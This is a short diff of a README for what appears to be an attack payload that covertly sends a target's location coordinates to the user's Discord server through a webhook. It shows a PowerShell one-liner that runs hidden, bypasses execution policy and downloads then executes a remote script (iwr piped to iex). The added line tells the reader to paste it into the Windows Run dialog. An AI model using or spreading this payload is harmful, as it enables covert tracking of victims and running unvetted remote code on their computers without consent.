@@ -25,3 +25,4 @@ Sends the coordinates of the target to your discord server via webhook
 ```
  PowerShell -w h -NoP -NonI -Exec Bypass iwr PASTE HERE | iex 
 ``` 
+<p> Now just paste that oneliner into your **run.exe** you can get there by pressing Win + R
